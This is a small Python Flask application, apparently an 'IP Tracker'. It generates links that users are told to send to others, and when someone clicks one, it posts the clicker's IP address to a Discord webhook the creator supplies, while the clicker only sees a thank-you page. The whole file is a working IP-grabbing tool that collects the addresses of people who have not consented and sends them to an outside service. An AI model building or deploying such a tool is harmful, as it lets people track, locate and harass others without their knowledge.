from flask import Flask, request
import requests

app = Flask(__name__)

@app.route('/')
def home():
    return "Welcome to the IP Tracker!"

@app.route('/track', methods=['GET'])
def track():
    webhook_url = request.args.get('webhook')

    if not webhook_url or not validate_webhook(webhook_url):
        return "Invalid URL format. Please enter a valid webhook URL.", 400

    tracking_link = f"http://localhost:5000/callback?webhook={webhook_url}"
    return f"Your tracking link: {tracking_link}<br>You can send this link to others to track their IP address."

def validate_webhook(url):
    return url.startswith("https://discord.com/api/webhooks/")

@app.route('/callback', methods=['GET'])
def callback():
    ip_address = request.remote_addr
    webhook_url = request.args.get('webhook')

    if webhook_url:
        message = f"Someone clicked the link! IP: {ip_address}"
        requests.post(webhook_url, json={"content": message})

    return "Thank you for clicking!", 200

if __name__ == '__main__':
    app.run(port=5000)